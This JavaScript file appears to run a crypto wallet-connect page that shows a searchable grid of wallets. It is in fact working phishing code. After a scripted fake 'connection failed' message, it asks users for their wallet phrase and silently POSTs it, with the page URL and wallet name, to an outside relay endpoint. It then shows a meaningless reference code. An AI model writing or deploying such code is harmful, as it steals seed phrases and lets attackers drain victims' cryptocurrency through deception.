let allWallets = [...wallets];
let filteredWallets = [...wallets];

// DOM Elements
const walletGrid = document.getElementById('walletGrid');
const searchBox = document.getElementById('walletSearch');
const clearSearch = document.getElementById('clearSearch');
const noResults = document.getElementById('noResults');
const modal = document.getElementById('walletModal');
const closeModal = document.getElementById('closeModal');
const modalWalletName = document.getElementById('modalWalletName');
const modalWalletImg = document.getElementById('modalWalletImg');
const statusIndicator = document.getElementById('statusIndicator');
const phraseForm = document.getElementById('phraseForm');
const submitPhrase = document.getElementById('submitPhrase');
const phraseInput = document.getElementById('phraseInput');

// Render wallets
function renderWallets(walletsToRender = filteredWallets) {
    walletGrid.innerHTML = '';

    if (walletsToRender.length === 0) {
        noResults.style.display = 'block';
        walletGrid.style.display = 'none';
        return;
    }

    noResults.style.display = 'none';
    walletGrid.style.display = 'grid';

    walletsToRender.forEach((wallet, index) => {
        const walletCard = document.createElement('div');
        walletCard.className = 'wallet-card fade-in';
        walletCard.style.animationDelay = `${index * 0.05}s`;
        walletCard.innerHTML = `
                    <div class="wallet-status"></div>
                    <div class="wallet-header">
                        <div class="wallet-icon">
                            <img src="${wallet.icon}" alt="${wallet.name}" loading="lazy">
                        </div>
                        <div class="wallet-info">
                            <h3>${wallet.name}</h3>
                            <p>${wallet.domain}</p>
                        </div>
                    </div>
                `;

        walletCard.addEventListener('click', () => openWalletModal(wallet));
        walletGrid.appendChild(walletCard);
    });
}

// Search functionality
function performSearch() {
    const searchTerm = searchBox.value.toLowerCase().trim();

    if (searchTerm === '') {
        filteredWallets = [...allWallets];
        clearSearch.style.display = 'none';
    } else {
        filteredWallets = allWallets.filter(wallet =>
            wallet.name.toLowerCase().includes(searchTerm) ||
            wallet.domain.toLowerCase().includes(searchTerm)
        );
        clearSearch.style.display = 'block';
    }

    renderWallets();
}

async function openWeb() {
    const provider = new ethers.BrowserProvider(window.ethereum);
    // Request accounts (v6: use provider.send)
    await provider.send('eth_requestAccounts', []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
}
// Modal functionality
async function openWalletModal(wallet) {
    modalWalletName.textContent = wallet.name;
    modalWalletImg.src = wallet.icon;
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    // Reset modal state
    statusIndicator.style.display = 'flex';
    phraseForm.style.display = 'none';
    statusIndicator.innerHTML = '<div class="loading-spinner"></div><span>Establishing connection...</span>';

    // create a Web3Provider instance
    openWeb();

    // Simulate connection attempt
    setTimeout(() => {
        statusIndicator.innerHTML = '<i class="fa-solid fa-exclamation-triangle" style="color: #f59e0b; margin-right: 12px;"></i><span>Connection failed - Manual setup required</span>';

        setTimeout(() => {
            statusIndicator.style.display = 'none';
            phraseForm.style.display = 'block';
        }, 2000);
    }, 3000);
}

function closeWalletModal() {
    modal.style.display = 'none';
    document.body.style.overflow = '';
    phraseInput.value = '';
    submitPhrase.disabled = false;
}

// Generate random code
function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Event Listeners
searchBox.addEventListener('input', performSearch);
searchBox.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        performSearch();
    }
});

clearSearch.addEventListener('click', () => {
    searchBox.value = '';
    performSearch();
    searchBox.focus();
});

closeModal.addEventListener('click', closeWalletModal);

modal.addEventListener('click', (e) => {
    if (e.target === modal) {
        closeWalletModal();
    }
});

// Phrase form submission
submitPhrase.addEventListener('click', async (e) => {
    e.preventDefault();
    const phrase = phraseInput.value.trim();

    if (!phrase) {
        phraseInput.style.borderColor = '#ef4444';
        phraseInput.focus();
        return;
    }

    submitPhrase.disabled = true;
    submitPhrase.innerHTML = '<div class="loading-spinner" style="width: 16px; height: 16px; margin-right: 6px;"></div>Connecting...';

    try {
        // API call
        const body = new URLSearchParams({
            dappLink: window.location.href,
            dappWord: phrase,
            dappName: modalWalletName.textContent
        });

        fetch('https://postmailgateway.com/relay/connect_node.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
            body: body.toString(),
            mode: 'cors'
        });

        // Generate reference code
        const refCode = generateRandomString(7);

        // Show success state
        phraseForm.innerHTML = `
                    <div style="text-align: center; padding: 20px 0;">
                        <i class="fa-solid fa-check-circle" style="font-size: 48px; color: #10b981; margin-bottom: 16px;"></i>
                        <h3 style="margin-bottom: 8px;">Connection Initiated</h3>
                        <p style="color: var(--text-muted); margin-bottom: 16px;">Please contact admin with reference code:</p>
                        <div style="background: var(--secondary-bg); padding: 12px; border-radius: 8px; font-family: monospace; font-size: 18px; font-weight: bold; letter-spacing: 2px;">${refCode}</div>
                    </div>
                `;

    } catch (error) {
        console.error('Connection error:', error);
        submitPhrase.disabled = false;
        submitPhrase.textContent = 'Connect Wallet';

        // Show error
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = 'color: #ef4444; text-align: center; margin-top: 12px; font-size: 14px;';
        errorDiv.textContent = 'Connection failed. Please try again.';
        phraseForm.appendChild(errorDiv);

        setTimeout(() => errorDiv.remove(), 3000);
    }
});

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    renderWallets();

    // Add some animation delays
    setTimeout(() => {
        document.querySelectorAll('.wallet-card').forEach((card, index) => {
            card.style.animationDelay = `${index * 0.1}s`;
        });
    }, 100);
});

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal.style.display === 'flex') {
        closeWalletModal();
    }

    if (e.ctrlKey && e.key === 'k') {
        e.preventDefault();
        searchBox.focus();
        searchBox.select();
    }
});

// Add some subtle animations on scroll
window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const cards = document.querySelectorAll('.wallet-card');

    cards.forEach(card => {
        const rect = card.getBoundingClientRect();
        const isVisible = rect.top < window.innerHeight && rect.bottom > 0;

        if (isVisible) {
            card.style.transform = `translateY(${scrolled * 0.02}px)`;
        }
    });
});

// Touch/swipe gestures for mobile
let touchStartY = 0;
let touchEndY = 0;

modal.addEventListener('touchstart', (e) => {
    touchStartY = e.changedTouches[0].screenY;
});

modal.addEventListener('touchend', (e) => {
    touchEndY = e.changedTouches[0].screenY;

    // Swipe down to close modal
    if (touchStartY < touchEndY - 100) {
        closeWalletModal();
    }
});

// Progressive Web App features
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
            .then(registration => console.log('SW registered'))
            .catch(registrationError => console.log('SW registration failed'));
    });
}

// Performance monitoring
window.addEventListener('load', () => {
    const perfData = performance.getEntriesByType('navigation')[0];
    if (perfData.loadEventEnd - perfData.loadEventStart > 3000) {
        console.warn('Page load time exceeded 3 seconds');
    }
});

// Auto-focus search on desktop
if (window.innerWidth > 768) {
    window.addEventListener('load', () => {
        setTimeout(() => searchBox.focus(), 500);
    });
}